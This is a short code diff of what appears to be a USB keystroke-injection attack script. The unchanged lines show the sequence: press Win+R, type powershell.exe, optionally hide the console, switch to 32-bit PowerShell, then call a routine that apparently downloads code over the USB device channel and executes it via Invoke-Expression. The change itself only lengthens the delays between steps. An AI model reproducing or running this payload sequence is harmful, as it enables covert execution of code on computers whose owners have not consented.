@@ -27,10 +27,10 @@ typingSpeed(0,0); // type as fast as possible
 press("GUI r");
 delay(500);
 type("powershell.exe\n");
-delay(500);
+delay(1000);
 
 if (hide) { hidePS(); } //hide the console if choosen to do so
-delay(500);
+delay(1000);
 assurePS32(); // open a 32bit console, if the current one is 64bit
-delay(500);
+delay(1000);
 hidDownAndIEX("1D6B", "1347");
